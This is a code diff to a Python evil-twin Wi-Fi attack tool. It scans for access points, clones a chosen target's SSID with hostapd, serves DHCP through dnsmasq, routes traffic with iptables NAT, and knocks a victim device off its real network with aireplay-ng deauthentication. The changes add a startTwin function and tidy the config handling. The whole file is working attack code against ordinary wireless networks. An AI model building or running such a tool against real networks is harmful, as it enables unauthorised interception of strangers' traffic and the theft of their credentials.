@@ -39,8 +39,7 @@ def displayMenu():
 		case 1:
 			displaySelectTarget()
 		case 2:
-			dnsmasqServer(file)
-			hostapdEnable()
+			startTwin()
 		case 3:
 			return False
 	return True
@@ -53,7 +52,6 @@ def displayInterfaceMenu():
 	match menu_entry_index:
 		case 0:
 			displayInterfaceNames('interfaceAP')
-			
 		case 1:
 			displayInterfaceNames('interfaceInternet')
 			firewallRouting(settings.globals["interfaceInternet"])
@@ -84,13 +82,20 @@ def firewallRouting(wlan):
 	shell("iptables -X")
 	shell("iptables -I POSTROUTING -t nat -o " + wlan + " -j MASQUERADE")
 
-def dnsmasqServer(file):
+def dnsmasqServerInit(wlan):
+	shell("ip addr add 192.168.1.1/24 dev " + wlan)
+	with open('conf/confDnsmasq.txt', 'w') as f:
+		f.write('interface=' + wlan + '\n')
+		f.write('dhcp-range=192.168.1.50,192.168.1.150,12h\n')
+		f.write('dhcp-option=6,8.8.8.8\n')
+		f.write('dhcp-option=3,192.168.1.1\n')
+
+def dnsmasqServer():
 	#shell("dnsmasq -d -C " + file)
-	call(["gnome-terminal", "-x", "sh", "-c", "dnsamsqServer " + file + " ; bash"])
+	call(["gnome-terminal", "-x", "sh", "-c", "dnsmasq -d -C conf/confDnsmasq.txt; bash"])
 
 def rogueApStart(wlan):
 	shell("airmon-ng start " + wlan)
-	shell("ip addr 192.168.1.1/24 dev " + wlan)
 
 def hostapdInit(wlan, ssid):
 	with open('conf/confRogueAP.txt', 'w') as f:
@@ -101,7 +106,7 @@ def hostapdInit(wlan, ssid):
 
 def hostapdEnable():
 	#shell('hostapd confRogueAP')
-	call(["gnome-terminal", "-x", "sh", "-c", "hostapd confRogueAP; bash"])
+	call(["gnome-terminal", "-x", "sh", "-c", "hostapd conf/confRogueAP.txt; bash"])
 
 def deAuth(wlan, bssid, MacDevice):
 	shell('aireplay-ng -0 1 -a '+ bssid + ' -c ' + MacDevice + ' ' + wlan)
@@ -135,7 +140,7 @@ def get_aps():
 
 def displaySelectTarget():
 	#airoScan(settings.global["interfaceAP"])
-	aps = get_aps();
+	aps = get_aps()
 	options = tabulate(aps["aps"], headers=aps["header"])
 	headers = options.split("\n")[0:2]
 	headers = "\n".join(headers)
@@ -147,3 +152,8 @@ def displaySelectTarget():
 	settings.globals["bssid"] = selectedTarget[0].lstrip()
 	settings.globals["channel"] = selectedTarget[3].lstrip()
 	hostapdInit(settings.globals["interfaceAP"], settings.globals["targetWifi"])
+
+def startTwin():
+	dnsmasqServerInit(settings.globals["interfaceAP"])
+	dnsmasqServer()
+	hostapdEnable()
